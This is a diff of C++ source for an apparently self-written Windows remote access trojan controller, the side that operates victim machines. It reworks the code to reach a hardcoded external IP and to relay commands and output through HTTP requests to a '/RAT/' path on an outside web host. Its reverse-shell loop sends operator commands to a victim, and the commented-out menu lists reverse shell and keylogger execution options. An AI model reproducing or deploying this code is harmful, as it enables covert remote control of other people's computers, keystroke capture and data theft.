@@ -4,10 +4,8 @@
 #include <Windows.h>
 #include <string>
 #include <thread>
-#include <tuple>
 #include <atomic>
 #include <sstream>                                                              // Include for stringstream
-#include <ws2tcpip.h>                                                           // For gai_strerror
 
 using namespace std;
 
@@ -16,20 +14,20 @@ using namespace std;
 
 int argc_global;
 char **argv_global;
-SOCKET listenSocket;
-SOCKET clientSocket;
+//SOCKET listenSocket;
+SOCKET sock;
 bool targetconnected = false;
 
 char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
 char os;
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-int socket_setup();
+int socket_setup(SOCKET &clientSocket);
 string get_client_ip(SOCKET clientSocket);
 void safe_closesocket(SOCKET& s);
 
-void send_data(SOCKET clientSocket, const string &data);
-string receive_data(SOCKET clientSocket);
+void send_data(SOCKET clientSocket, const string &filename ,const string &data);
+string receive_data(SOCKET clientSocket, const string &filename);
 
 void os_detection();
 bool getdata_from_file();
@@ -43,193 +41,207 @@ int main(int argc, char *argv[])
     argc_global = argc;
     argv_global = argv;
     
-    if (socket_setup() != 0) return 1;
+    if (socket_setup(sock) != 0) return 1;
     
-    bool loop = true;
-    while(loop)
-    {
-        switch (Get_menu_option())
-        {
-            case '1':                                                                         //connect
-            {   
-                if(!targetconnected)
-                {    
-                    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
-                    {
-                        std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
-                        safe_closesocket(listenSocket);
-                        WSACleanup();
+//     bool loop = true;
+//     while(loop)
+//     {
+//         switch (Get_menu_option())
+//         {
+//             case '1':                                                                         //connect
+//             {   
+//                 if(!targetconnected)
+//                 {    
+//                     if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
+//                     {
+//                         std::cerr << "listen failed with error: " << WSAGetLastError() << std::endl;
+//                         safe_closesocket(listenSocket);
+//                         WSACleanup();
                         
-                        return 1;
-                    }               
-                    cout << "\n>> Waiting for incoming connections..." << endl;
+//                         return 1;
+//                     }               
+//                     cout << "\n>> Waiting for incoming connections..." << endl;
 
-    /////////////////////////////////////////////////////change this when internet////////////////////////////////////////////////
-    // can make if(checkip) and do something....
-                    clientSocket = accept(listenSocket, nullptr, nullptr);                
-                    if(get_client_ip(clientSocket) == "127.0.0.1")
-                    {   
-                        cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
-                        targetconnected = true;
-                    }
-                    else 
-                    {
-                        cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
-                        closesocket(clientSocket);
-                    }
-                }
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                else
-                {
-                    cout << ">> Already connected to a target." << endl;
-                    system("pause");                    
-                }
+//     /////////////////////////////////////////////////////change this when internet////////////////////////////////////////////////
+//     // can make if(checkip) and do something....
+//                     clientSocket = accept(listenSocket, nullptr, nullptr);                
+//                     if(get_client_ip(clientSocket) == "127.0.0.1")
+//                     {   
+//                         cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
+//                         targetconnected = true;
+//                     }
+//                     else 
+//                     {
+//                         cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
+//                         closesocket(clientSocket);
+//                     }
+//                 }
+// /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//                 else
+//                 {
+//                     cout << ">> Already connected to a target." << endl;
+//                     system("pause");                    
+//                 }
 
-                break;
-            }
+//                 break;
+//             }
             
-            case '2':                                                                     //Rev shell
-            {
-                if (targetconnected && clientSocket != INVALID_SOCKET) 
-                {
-                    send_data(clientSocket, "2");
-                    cout << ">> Sent " << endl;
-                } 
-                else
-                {
-                    cout << ">> Target not connected or socket invalid!!" << endl;
-                    system("pause");
-                }
+//             case '2':                                                                     //Rev shell
+//             {
+//                 if (targetconnected && clientSocket != INVALID_SOCKET) 
+//                 {
+//                     send_data(clientSocket, "2");
+//                     cout << ">> Sent " << endl;
+//                 } 
+//                 else
+//                 {
+//                     cout << ">> Target not connected or socket invalid!!" << endl;
+//                     system("pause");
+//                 }
                 
-                Rev_Shell();
+//                 Rev_Shell();
 
-                break;
-            }
+//                 break;
+//             }
             
-            case '3':                                                                     //Execute keylogger
-            {
-                if (targetconnected && clientSocket != INVALID_SOCKET)
-                {
-                    send_data(clientSocket, "3");
-                    send_data(clientSocket, "hello.vbs");
+//             case '3':                                                                     //Execute keylogger
+//             {
+//                 if (targetconnected && clientSocket != INVALID_SOCKET)
+//                 {
+//                     send_data(clientSocket, "3");
+//                     send_data(clientSocket, "hello.vbs");
 
-                    cout << ">> Sent " << endl;
-                }
-                else cout << ">> Target not connected or socket invalid!!" << endl;
-                system("pause");
+//                     cout << ">> Sent " << endl;
+//                 }
+//                 else cout << ">> Target not connected or socket invalid!!" << endl;
+//                 system("pause");
 
-                break;
-            }
-            case '~':                                                                    //DC Current target
-            {
-                if (targetconnected)
-                {
-                    send_data(clientSocket,"~");
-                    safe_closesocket(clientSocket);
-                    safe_closesocket(listenSocket);
-                    targetconnected = false;
+//                 break;
+//             }
+//             case '~':                                                                    //DC Current target
+//             {
+//                 if (targetconnected)
+//                 {
+//                     send_data(clientSocket,"~");
+//                     safe_closesocket(clientSocket);
+//                     safe_closesocket(listenSocket);
+//                     targetconnected = false;
 
-                    if (socket_setup() != 0) return 1;
-                    cout << ">> Disconnecting client..." << endl << endl;
-                } 
-                else cout << ">> No client connected to disconnect." << endl;
-                system("pause");
+//                     if (socket_setup() != 0) return 1;
+//                     cout << ">> Disconnecting client..." << endl << endl;
+//                 } 
+//                 else cout << ">> No client connected to disconnect." << endl;
+//                 system("pause");
                 
-                break;
-            }
-            case '#':                                                                    //DC Current target and stop its code execution
-            {
-                if (targetconnected)
-                {
-                    send_data(clientSocket,"#");
-                    safe_closesocket(clientSocket);
-                    targetconnected = false;
+//                 break;
+//             }
+//             case '#':                                                                    //DC Current target and stop its code execution
+//             {
+//                 if (targetconnected)
+//                 {
+//                     send_data(clientSocket,"#");
+//                     safe_closesocket(clientSocket);
+//                     targetconnected = false;
                     
-                    cout << ">> Disconnecting client and requesting stop..." << endl << endl;
-                } 
-                else cout << ">> No client connected to disconnect." << endl;
-                system("pause");
+//                     cout << ">> Disconnecting client and requesting stop..." << endl << endl;
+//                 } 
+//                 else cout << ">> No client connected to disconnect." << endl;
+//                 system("pause");
 
-                break;
-            }
-            case '0':                                                                     //Exit console
-            {
+//                 break;
+//             }
+//             case '0':                                                                     //Exit console
+//             {
 
-                if(!targetconnected)
-                {
-                    safe_closesocket(clientSocket);
-                    safe_closesocket(listenSocket);
+//                 if(!targetconnected)
+//                 {
+//                     safe_closesocket(clientSocket);
+//                     safe_closesocket(listenSocket);
 
-                    WSACleanup();
-                    cout << ">> Exiting..." << endl << endl;
-                    loop = false;
-                }
-                else
-                {
-                    cout << ">> Target not disconnected!!" << endl;
-                    system("pause");
-                }
-                break;
-            }
-            default:
-            {
-                cout << ">> Invalid option ( -_- )" << endl << endl;
-                system("pause");
-                break;
-            }
-        }
-    }   
+//                     WSACleanup();
+//                     cout << ">> Exiting..." << endl << endl;
+//                     loop = false;
+//                 }
+//                 else
+//                 {
+//                     cout << ">> Target not disconnected!!" << endl;
+//                     system("pause");
+//                 }
+//                 break;
+//             }
+//             default:
+//             {
+//                 cout << ">> Invalid option ( -_- )" << endl << endl;
+//                 system("pause");
+//                 break;
+//             }
+//         }
+//     }   
 
+    send_data(sock, "from_server.txt","Hello, client!");
+    cout << receive_data(sock,"from_client.txt");
+    
+    safe_closesocket(sock);
     return 0;
 }
 
-int socket_setup()
+int socket_setup(SOCKET &clientSocket)
 {
+    bool connected = false;
+
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
         std::cerr << "WSAStartup failed.\n";
         return 1;
     }
 
-    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (listenSocket == INVALID_SOCKET) {
-        std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET)
+    {
+        std::cerr << "socket failed.\n";
         WSACleanup();
         return 1;
     }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8081);
-    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_port = htons(80);
+    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
 
-    int reuse = 1;
-    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
-        std::cerr << "setsockopt failed with error: " << WSAGetLastError() << std::endl;
-        safe_closesocket(listenSocket); // Use safe_closesocket here
-        WSACleanup();
-        return 1;
+    connected = false;
+    while (!connected)
+    {
+        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+            int error = WSAGetLastError();
+            if (error != WSAECONNREFUSED)
+            {
+                std::stringstream ss;
+                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
+                std::cerr << ss.str();
+            }   
+            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+            Sleep(2000);
+        }
+        else
+        {
+            std::cout << "Connected to the server!\n";
+            connected = true;
+        }
     }
-
-    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "bind failed with error: " << WSAGetLastError() << std::endl;
-        safe_closesocket(listenSocket); // Use safe_closesocket here
-        WSACleanup();
-        return 1;
-    }
-
     return 0;
-
 }
 
-void send_data(SOCKET clientSocket, const string &data)                                         // Doesnot send special data 
+void send_data(SOCKET clientSocket, const string &filename ,const string &data)
 {
+    string whole_data = filename+data;
     string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Content-Length: " + to_string(data.length()) + "\r\n";
+    httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
     httpRequest += "Content-Type: application/octet-stream\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
-    httpRequest += data;                                                                // Append the actual data
+    httpRequest += "Connection: keep-alive\r\n\r\n";
+    httpRequest += whole_data;                                                         // Append the actual data
 
     int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
     if (bytesSent == SOCKET_ERROR)
@@ -239,13 +251,13 @@ void send_data(SOCKET clientSocket, const string &data)                         
     }
 }
 
-string receive_data(SOCKET clientSocket)
+string receive_data(SOCKET clientSocket, const string &filename)
 {
-    string httpRequest = "GET /RAT/Rat_Data HTTP/1.1\r\n";
+    string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
     httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
+    httpRequest += "Connection: keep-alive\r\n\r\n";
 
-    //cout<< httpRequest<<endl;
+    cout<< httpRequest<<endl;
 
     int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
     if (bytesSent == SOCKET_ERROR)
@@ -277,6 +289,10 @@ string receive_data(SOCKET clientSocket)
             break; // Exit loop on error
         }
     } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+
+    cout << "Response ->\n"<<bytesReceived;
+
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     // Robust HTTP response parsing
     size_t headerEnd = receivedData.find("\r\n\r\n");
@@ -364,7 +380,7 @@ bool getdata_from_file()
     return true;
 }
 
-int Rev_Shell()
+int Rev_Shell(SOCKET clientSocket)
 {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -374,7 +390,7 @@ int Rev_Shell()
     {
         while (!processFinished.load())
         {
-            string data = receive_data(clientSocket);
+            string data = receive_data(clientSocket, "from_client.txt");
             if (data.empty()) break;                                                            // Client has disconnected or there was an error
             cout << data;
             Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
@@ -390,11 +406,11 @@ int Rev_Shell()
             {
                 if (cmd == "exit")
                 {
-                    send_data(clientSocket, "exit");
+                    send_data(clientSocket, "from_server.txt" ,"exit");
                     processFinished.store(true);
                     break;
                 }
-                send_data(clientSocket, cmd);
+                send_data(clientSocket, "from_server.txt" ,cmd);
             }
             Sleep(10);
         }
